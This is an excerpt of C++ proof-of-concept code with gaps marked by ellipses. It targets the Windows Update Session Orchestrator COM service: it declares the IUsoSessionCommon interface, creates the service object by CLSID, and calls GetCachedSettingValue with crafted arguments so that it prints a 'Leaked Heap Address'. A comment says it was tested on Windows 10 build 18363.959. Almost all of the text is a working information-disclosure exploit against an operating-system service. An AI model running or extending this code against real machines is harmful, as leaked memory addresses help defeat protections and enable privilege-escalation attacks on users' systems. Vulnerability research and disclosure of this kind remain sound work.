...
public:
	...
	virtual HRESULT __stdcall SetSessionVariable(wchar_t* p0, VARIANT* p1) = 0;
	virtual HRESULT __stdcall GetSessionVariable(wchar_t* p0, VARIANT* p1) = 0;
	virtual HRESULT __stdcall SetSessionProperty(int p0, VARIANT* p1) = 0;
	virtual HRESULT __stdcall GetSessionProperty(int p0, VARIANT* p1) = 0;
	virtual HRESULT __stdcall UsoEnableUserInstallableContent(wchar_t* p0, wchar_t* p1, wchar_t* p2) = 0;
	virtual HRESULT __stdcall Revert(wchar_t* p0, wchar_t* p1, wchar_t* p2) = 0;
	virtual HRESULT __stdcall GetCachedPolicyValue(int p0, VARIANT* p1, int* p2) = 0;
	virtual HRESULT __stdcall GetUpdatePayloadSize(int p0, long* p1, long* p2) = 0;
	virtual HRESULT __stdcall RefreshSettings() = 0;
	virtual HRESULT __stdcall GetCachedSettingValue(int p0, short p1, VARIANT* p2) = 0;
...
ComPtr<IUpdateSessionOrchestrator> IUpdateSessionOrchestrator_obj;
ComPtr< IUsoSessionCommon> IUsoSessionCommon_obj;
ComPtr< IUsoUpdateCollection> IUsoUpdateCollection_obj;
HRESULT hr;
HSTRING st;
...
int wmain()
{
	...
	CLSIDFromString(OLESTR("{B91D5831-B1BD-4608-8198-D72E155020F7}"), &clsid); 
	hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, __uuidof(IUpdateSessionOrchestrator_obj), (void**)&IUpdateSessionOrchestrator_obj);
	...
	hr = IUpdateSessionOrchestrator_obj->CreateUpdateSession(1,&IID_IUsoSessionCommon,&IUsoSessionCommon_obj);
	if (FAILED(hr)) PrintError(__LINE__, hr);


	VARIANT p3;
	VariantInit(&p3);
	// test in Windows 10 1909 18363.959
	hr = IUsoSessionCommon_obj->GetCachedSettingValue(0x19, VT_EMPTY, &p3);
	if (  FAILED(hr) && hr!= 0x80070057) PrintError(__LINE__, hr);
	printf("Leaked Heap Address : 0x%llx\n", *(__int64*)&p3);
